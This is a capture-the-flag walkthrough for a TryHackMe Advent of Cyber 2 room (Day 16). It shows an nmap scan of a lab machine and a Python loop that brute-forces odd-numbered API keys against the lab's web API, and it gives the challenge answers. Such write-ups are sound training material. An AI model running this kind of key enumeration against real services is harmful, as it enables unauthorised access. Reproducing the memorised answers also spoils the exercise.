# _adventofcyber2 Day 16_

	https://tryhackme.com/room/adventofcyber2
	
--------------------------------------------------------------------------------

							  
	┌──(astute㉿kali)-[~]
	└─$ nmap -sV -A 10.10.223.21
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 18:28 IST
	Nmap scan report for 10.10.223.21
	Host is up (0.42s latency).
	Not shown: 997 closed ports
	PORT     STATE    SERVICE VERSION
	22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 31:4e:6f:1b:9b:4d:a6:9f:34:f0:ca:3e:96:31:a6:9e (RSA)
	|   256 60:5d:1b:59:24:8b:b8:7a:5f:1c:75:55:5f:bf:e0:83 (ECDSA)
	|_  256 05:08:d8:66:d1:04:cf:91:8c:6a:56:55:df:07:a4:d6 (ED25519)
	80/tcp   open     http    uvicorn
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.1 404 Not Found
	|     date: Fri, 13 Aug 2021 12:59:05 GMT
	|     server: uvicorn
	|     content-length: 22
	|     content-type: application/json
	|     {"detail":"Not Found"}
	|   GetRequest: 
	|     HTTP/1.1 200 OK
	|     date: Fri, 13 Aug 2021 12:58:56 GMT
	|     server: uvicorn
	|     content-type: text/html; charset=utf-8
	|     content-length: 7014
	|     last-modified: Tue, 29 Dec 2020 00:35:06 GMT
	|     etag: fad18236c6876faf561b8ae1bf30c41e
	|     <!DOCTYPE html>
	|     <html>
	|     <head>
	|     <meta charset="utf-8">
	|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
	|     <meta name="viewport" content="width=device-width, initial-scale=1">
	|     <title>Santa's Tracker</title>
	|     <link rel="shortcut icon" href="" type="image/x-icon">
	|     <link rel="stylesheet" type="text/css" href="../static/bulma.css">
	|     <!-- Bulma Version 0.9.0-->
	|     <link rel="stylesheet" type="text/css" href="../hero.css">
	|     <!-- <link rel="stylesheet" href="https://unpkg.com/bulma-modal-fx/dist/css/modal-fx.min.css" /> -->
	|     </head>
	|     <body>
	|     <section class="hero is-info is-medium is-bold">
	|   HTTPOptions: 
	|     HTTP/1.1 405 Method Not Allowed
	|     date: Fri, 13 Aug 2021 12:59:03 GMT
	|     server: uvicorn
	|     content-length: 31
	|     content-type: application/json
	|_    {"detail":"Method Not Allowed"}
	|_http-server-header: uvicorn
	|_http-title: Santa's Tracker


On `port 80` we can see there is `HTTP` server running 

=> `80`

------------------------------------------------------------------------------------------------------

second question wants to find directory of url for `api` without using any `tools` like `dirbuster` 

=> `/api/`

--------------------------------------------------------------------------------------

now let's make a `script` using `python` 

	##########
	# script to find the correct key from the API_Key
	# which is an odd number from 1 to 100
	##########

	import requests

	url = 'http://10.10.223.21:8000/api/'

	# Generate list of odd numbers from 1 to 100
	odd_numbers = list(range(1, 100, 2))

	# Loop to make the request with each number
	for i in odd_numbers:
		r = requests.get(url+str(i))

		# Check if is the key
		if not 'Error. Key not valid!' in r.text:
			print("KEY FOUND: " + str(i))

	# Correct API KEY: 57
	# URL: http://10.10.223.21:8000/api/57


`note` change the IP to your own 


on this site `http://10.10.223.21/api/57` we finally able to find his `location` 

=> `Winter Wonderland, Hyde Park, London.`

---------------------------------------------------------------------------

we also find the right `api` key

=> `57`

---------------------------------------------------------------------

# _Thank you_
